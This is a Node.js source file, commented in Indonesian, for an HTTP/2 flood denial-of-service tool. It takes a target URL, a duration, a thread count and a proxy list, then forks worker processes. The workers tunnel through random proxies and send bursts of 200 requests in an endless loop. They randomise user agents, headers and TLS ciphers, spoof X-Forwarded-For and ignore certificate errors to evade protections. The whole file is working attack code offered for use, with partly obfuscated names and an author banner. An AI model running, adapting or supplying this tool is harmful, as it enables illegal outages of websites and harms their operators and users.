const url = require('url');
const fs = require('fs');
const http2 = require("http2");
const http = require('http');
const tls = require('tls');
const cluster = require("cluster");
const fakeua = require("fake-useragent");

// Daftar cipher suites untuk koneksi TLS
const cplist = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK'
];

// Daftar header Accept untuk randomisasi
const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8",
    "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*",
    "text/html, application/xhtml+xml, image/jxr, */*",
    "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1",
    "application/javascript, */*;q=0.8",
    "text/html, text/plain; q=0.6, */*; q=0.1",
    "application/graphql, application/json; q=0.8, application/xml; q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
];

// Daftar header Accept-Language untuk randomisasi
const lang_header = [
    "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
    "en-US,en;q=0.5",
    "en-US,en;q=0.9",
    'de-CH;q=0.7',
    "da, en-gb;q=0.8, en;q=0.7",
    "cs;q=0.5"
];

// Daftar header Accept-Encoding untuk randomisasi
const encoding_header = [
    "gzip, deflate",
    "br;q=1.0, gzip;q=0.8, *;q=0.1",
    "gzip",
    "gzip, compress",
    "compress, deflate",
    "compress",
    "gzip, deflate, br",
    "deflate"
];

// Daftar header Cache-Control untuk randomisasi
const controle_header = [
    'max-age=604800',
    'no-cache',
    'no-store',
    'no-transform',
    "only-if-cached",
    'max-age=0',
    "no-cache, no-store,private, max-age=0, must-revalidate",
    "no-cache, no-store,private, s-maxage=604800, must-revalidate",
    "no-cache, no-store,private, max-age=604800, must-revalidate"
];

// Daftar error names yang akan diabaikan
const ignoreNames = ["RequestError", "StatusCodeError", "CaptchaError", "CloudflareError", "ParseError", "ParserError"];

// Daftar error codes yang akan diabaikan
const ignoreCodes = ["SELF_SIGNED_CERT_IN_CHAIN", 'ECONNRESET', "ERR_ASSERTION", "ECONNREFUSED", "EPIPE", "EHOSTUNREACH", "ETIMEDOUT", "ESOCKETTIMEDOUT", 'EPROTO'];

// Handler untuk menangani exception yang tidak tertangkap
process.on('uncaughtException', function (_0x174c06) {
    if (_0x174c06.code && ignoreCodes.includes(_0x174c06.code) || _0x174c06.name && ignoreNames.includes(_0x174c06.name)) {
        return false; // Abaikan error yang termasuk dalam daftar ignore
    }
}).on('unhandledRejection', function (_0x4ef34e) {
    if (_0x4ef34e.code && ignoreCodes.includes(_0x4ef34e.code) || _0x4ef34e.name && ignoreNames.includes(_0x4ef34e.name)) {
        return false; // Abaikan promise rejection yang termasuk dalam daftar ignore
    }
}).on("warning", _0x2a9dc4 => {
    if (_0x2a9dc4.code && ignoreCodes.includes(_0x2a9dc4.code) || _0x2a9dc4.name && ignoreNames.includes(_0x2a9dc4.name)) {
        return false; // Abaikan warning yang termasuk dalam daftar ignore
    }
}).setMaxListeners(0x0); // Set max listeners ke unlimited

// Fungsi untuk mendapatkan header Accept secara random
function accept() {
    return accept_header[Math.floor(Math.random() * accept_header.length)];
}

// Fungsi untuk mendapatkan header Accept-Language secara random
function lang() {
    return lang_header[Math.floor(Math.random() * lang_header.length)];
}

// Fungsi untuk mendapatkan header Accept-Encoding secara random
function encoding() {
    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
}

// Fungsi untuk mendapatkan header Cache-Control secara random
function controling() {
    return controle_header[Math.floor(Math.random() * controle_header.length)];
}

// Fungsi untuk mendapatkan cipher suite secara random
function cipher() {
    return cplist[Math.floor(Math.random() * cplist.length)];
}

// Mendapatkan parameter dari command line
const target = process.argv[2];      // Target URL
const time = process.argv[3];        // Waktu attack (dalam detik)
const thread = process.argv[4];      // Jumlah thread
const proxys = fs.readFileSync(process.argv[5], "utf-8").toString().match(/\S+/g); // Membaca file proxy

// Fungsi untuk mendapatkan proxy random
function proxyr() {
    return proxys[Math.floor(Math.random() * proxys.length)];
}

// Jika proses adalah master (proses utama)
if (cluster.isMaster) {
    // Menampilkan informasi attack
    console.log("\x1B[36mURL: \x1B[37m" + url.parse(target).host + 
                "\n\x1B[36mThread: \x1B[37m" + thread + 
                "\n\x1B[36mTime: \x1B[37m" + time + 
                "\n\x1B[36m@HaffizJembut\x1BAttack Succesfully \n\x1B https://dazenc2.my.id/ ");
    
    // Membuat worker processes sesuai jumlah thread
    for (var bb = 0; bb < thread; bb++) {
        cluster.fork();
    }
    
    // Set timer untuk menghentikan proses setelah waktu tertentu
    setTimeout(() => {
        process.exit(-1); // Keluar dari proses
    }, time * 1000);
    
} else {
    // Jika proses adalah worker (child process)
    
    // Fungsi utama untuk melakukan flood attack
    function flood() {
        var _0x253221 = url.parse(target); // Parse URL target
        
        const _0x48a9a8 = fakeua(); // Generate fake user agent
        
        var _0x4771de = cplist[Math.floor(Math.random() * cplist.length)]; // Pilih cipher random
        
        var _0xe5bf4f = proxys[Math.floor(Math.random() * proxys.length)].split(':'); // Pilih proxy random
        
        // Membuat headers untuk request HTTP/2
        var _0x137eed = {
            ':path': _0x253221.path,                    // Path URL
            'X-Forwarded-For': _0xe5bf4f[0],           // IP proxy
            'X-Forwarded-Host': _0xe5bf4f[0],          // Host proxy
            ':method': "GET",                           // HTTP method
            'User-agent': _0x48a9a8,                   // Fake user agent
            'Origin': target,                           // Origin header
            'Accept': accept_header[Math.floor(Math.random() * accept_header.length)],      // Random accept header
            'Accept-Encoding': encoding_header[Math.floor(Math.random() * encoding_header.length)], // Random encoding header
            'Accept-Language': lang_header[Math.floor(Math.random() * lang_header.length)], // Random language header
            'Cache-Control': controle_header[Math.floor(Math.random() * controle_header.length)] // Random cache control
        };
        
        // Membuat HTTP agent dengan keep-alive
        const _0x5dd1d7 = new http.Agent({
            'keepAlive': true,          // Mengaktifkan keep-alive
            'keepAliveMsecs': 20000,    // Keep-alive timeout 20 detik
            'maxSockets': 0             // Unlimited sockets
        });
        
        // Membuat CONNECT request melalui proxy
        var _0x399c2d = http.request({
            'host': _0xe5bf4f[0],       // Host proxy
            'agent': _0x5dd1d7,         // HTTP agent
            'globalAgent': _0x5dd1d7,   // Global agent
            'port': _0xe5bf4f[1],       // Port proxy
            'headers': {
                'Host': _0x253221.host, // Host target
                'Proxy-Connection': "Keep-Alive", // Keep connection alive
                'Connection': "Keep-Alive"        // Keep connection alive
            },
            'method': 'CONNECT',        // CONNECT method untuk tunneling
            'path': _0x253221.host + ":443" // Target host dengan port 443 (HTTPS)
        }, function () {
            _0x399c2d.setSocketKeepAlive(true); // Set socket keep alive
        });
        
        // Event ketika koneksi melalui proxy berhasil
        _0x399c2d.on("connect", function (_0x5a3f5c, _0x55e92d, _0x32bb9b) {
            // Membuat koneksi HTTP/2 melalui tunnel proxy
            const _0x5e3082 = http2.connect(_0x253221.href, {
                'createConnection': () => tls.connect({
                    'host': _0x253221.host,         // Host target
                    'ciphers': _0x4771de,           // Cipher suites
                    'secureProtocol': 'TLS_method', // Protocol TLS
                    'TLS_MIN_VERSION': "1.2",       // Min TLS version
                    'TLS_MAX_VERSION': "1.3",       // Max TLS version
                    'servername': _0x253221.host,   // Server name
                    'secure': true,                 // Koneksi secure
                    'rejectUnauthorized': false,    // Tidak menolak cert tidak terauthorisasi
                    'ALPNProtocols': ['h2'],        // Protocol ALPN HTTP/2
                    'socket': _0x55e92d             // Socket dari proxy
                }, function () {
                    // Mengirim 200 request secara bersamaan
                    for (let _0x3b220d = 0; _0x3b220d < 200; _0x3b220d++) {
                        const _0x20f290 = _0x5e3082.request(_0x137eed); // Membuat request HTTP/2
                        _0x20f290.setEncoding("utf8"); // Set encoding
                        _0x20f290.on("data", _0x3941e3 => {}); // Handler data response
                        _0x20f290.on("response", () => {
                            _0x20f290.close(); // Close request setelah dapat response
                        });
                        _0x20f290.end(); // Mengakhiri request
                    }
                })
            });
        });
        
        _0x399c2d.end(); // Mengakhiri CONNECT request
    }
    
    // Menjalankan flood attack secara terus menerus
    setInterval(() => {
        flood();
    });
}
